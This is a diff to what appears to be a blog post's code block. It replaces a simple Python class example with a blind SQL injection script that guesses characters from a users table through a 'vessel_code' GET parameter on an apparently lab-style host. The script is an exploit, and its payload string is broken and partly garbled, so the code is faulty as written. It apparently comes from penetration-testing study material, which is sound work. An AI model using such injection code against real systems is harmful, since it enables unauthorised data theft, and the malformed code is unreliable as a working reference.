@@ -42,20 +42,25 @@ import sys
 
 import requests
 
-# Define the class
-class Employee:
-    name = "Mostak Mahmud"
-    # Define the method
-    def details(self):
-        print("Post: Marketing Officer")
-        print("Department: Sales")
-        print("Salary: $1000")
-# Create the employee object    
-emp = Employee()
-# Print the class variable
-print("Name:",emp.name)
-# Call the class method
-emp.details()
+chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
+url = 'http://ports.inlanefreight.com/vessel_check.php'
+
+
+def find_data(column, length, column_num):
+    data = ''
+    for position in range(length):
+        for ch in chars:
+            payload = "cn' or substr((select {} for users limit {},1), {} ,1)='{}
+            '== =".format(
+                column, column_num, position+1, ch)
+          # Create injection payload with each character and position
+            # vessel_code paramter for GET requests
+            params = {'vessel_code': payload}
+            response = requests.get(url, params=params)
+            if 'maintenance' not in response.text:
+                data += ch
+                break
+    return data
 {% endhighlight %}
 
 
